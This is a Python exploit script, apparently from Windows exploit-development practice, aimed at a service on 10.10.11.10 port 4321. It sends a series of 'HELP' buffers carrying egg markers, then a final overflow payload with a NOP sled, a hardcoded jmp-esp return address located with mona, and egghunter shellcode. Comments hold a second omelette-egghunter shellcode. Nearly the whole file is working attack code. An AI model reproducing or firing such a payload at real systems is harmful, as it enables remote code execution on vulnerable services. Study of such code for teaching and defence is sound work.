
#!/usr/bin/python

import socket
import os
import sys
import time
host = "10.10.11.10"
port = 4321




time.sleep(0)
buffer = 'HELP '
buffer += "ABBAABBA"
buffer = "A" * 48
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(0)
print(s.recv(1024))

s.send(buffer)

time.sleep(0)
s.close()


#for count in range(1,6):
#	time.sleep(0)
#	buffer = 'HELP '
#	buffer += "\x90" * 50
#	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#	s.connect((host,port))
#	time.sleep(0)
#	print(s.recv(1024))
#
#	s.send(buffer)
#	time.sleep(0)
#	s.close()







time.sleep(0)
buffer = 'HELP '
#!mona egg -t fred
buffer += "ABBAABBA"

#buffer += "FREDFRED"
#buffer += "\x90" * 6


#buffer += "`xcc"
buffer = "A" * 40
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(0)
print(s.recv(1024))


s.send(buffer)

time.sleep(0)
s.close()


#time.sleep(0)
#buffer = 'HELP '

#buffer += "B" * 60
#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect((host,port))

#time.sleep(0)
#print(s.recv(1024))


#s.send(buffer)

#time.sleep(0)
#s.close()



time.sleep(0)
buffer = 'HELP '

buffer += "C" * 48
buffer += "ABBAABBA"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(0)
print(s.recv(1024))

s.send(buffer)

time.sleep(0)
s.close()






time.sleep(0)
buffer = 'HELP '
buffer += "ABBAABBA"
#buffer += "MOCHMOCH"
buffer += "D" * 30
buffer += "ABBAABBA"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(0)
print(s.recv(1024))

s.send(buffer)

time.sleep(0)
s.close()






time.sleep(0)
buffer = 'HELP '

buffer += "E" * 20
buffer += "ABBAABBA"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(0)
print(s.recv(1024))

s.send(buffer)

time.sleep(0)
s.close()



time.sleep(0)
buffer = 'HELP '

buffer += "F" * 40
buffer += "ABBAABBA"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

time.sleep(0)
print(s.recv(1024))

s.send(buffer)

time.sleep(0)
s.close()










buffer = 'HELP '
buffer += '\x90' * 7
#buffer += 'CCCC'
#the cccc is what you replace with the address
#buffer += 'CCCC'

#0x77e766e2 : call esp |  {PAGE_EXECUTE_READ} [kernel32.dll] AS
#output of !mona jmp -r esp
#0x7c836a78  


buffer += '\x78\x6a\x83\x7c'





#root@kali:~/tools/Advanced-Windows-Exploit-Development-Practice/offsecsrv/xpactuallyignoreeverythingelse# cat omelette | perl -e 'print chr(0x22); while (read STDIN, $d, 1) #{print "\\x" . sprintf( "%02x", ord($d)); $c++; if ($c == 14) {print chr(0x22) . " .\n" . chr(0x22);$c=0}}; print chr(0x22) . ";\n"' 
#"\x89\xe5\x66\x81\xcb\xff\x0f\x43\x31\xc0\xb0\x02\x89\xda" .
#"\xcd\x2e\x3c\x05\x74\xee\xb8\x12\x34\x56\x78\x89\xdf\xaf" .
#"\x75\xe9\xaf\x75\xe6\x89\xfe\x89\xef\x66\xad\x31\xc9\x88" .
#"\xe1\x3c\x01\xf3\xa4\x89\xfd\x75\xd4\xff\xe4";
#you will plant this in a second memory buffer after you are able to egghunt a second 








buffer += "\x90" 

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x41\x42\x42\x41\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")


buffer += egghunter

buffer += '('

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
#print s.recv(1024)
time.sleep(0)













s.send(buffer)
#print s.recv(1024)
time.sleep(0)
